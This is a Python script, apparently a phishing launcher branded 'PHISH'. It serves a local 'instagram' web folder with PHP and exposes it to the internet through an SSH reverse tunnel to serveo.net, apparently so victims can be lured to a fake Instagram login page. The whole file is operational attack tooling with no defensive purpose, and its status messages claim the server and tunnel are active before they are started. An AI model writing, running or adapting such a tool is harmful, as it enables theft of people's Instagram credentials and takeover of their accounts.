import os
import requests
import time
from pathlib import Path
from colorama import init, Fore

init(autoreset=True)

logo = r"""
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██╔══██╗██║  ██║██║██╔════╝██║  ██║
██████╔╝███████║██║█████╗  ███████║
██╔═══╝ ██╔══██║██║██╔══╝  ██╔══██║
██║     ██║  ██║██║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
"""

print(Fore.RED + logo)
print(Fore.GREEN + "[+] PHP server running at http://127.0.0.1:8000")
print(Fore.YELLOW + "[+] Serveo tunnel is active!")



def run_server_php():
    project_dir = Path(__file__).parent.resolve()
    
    web_dir = project_dir / "instagram"
    if not web_dir.is_dir():
        print("❌ please download again script", web_dir)
        
    # list you want to go and rund php server
    os.chdir(web_dir)
    os.system("start /B php -S 127.0.0.1:8000 > NUL 2>&1")
 

        
def port_forwarding():
    project_dir_port_forwarding = Path(__file__).parent.resolve()
    web_dir = project_dir_port_forwarding / "instagram"
    if not web_dir.is_dir():
        print("❌ please download again script ", web_dir)
        

    os.chdir(web_dir)
    os.system("start /B ssh -R 80:127.0.0.1:8000 serveo.net ")
    
    
def check_internet_conction():
   
    try:
        request_cheack=requests.get("https://www.google.com")
       
        print(Fore.GREEN + f"cheaking conection.....")
        
        if (request_cheack.status_code==200):
            run_server_php()
            print(Fore.YELLOW + "plaese waiting for make link to you ....... ")
            time.sleep(5)
            port_forwarding()

        else:
            print("❌ plaese cheack internet can't conecect to internet ")
    except requests.ConnectionError:
        print(Fore.RED + "❌ plaese cheack internet can't conecet to internet ")

        



# run all of functions first u should check_internet_conction() when see fucntion it u see run & run_server_php() && port_forwarding()
          

            

check_internet_conction()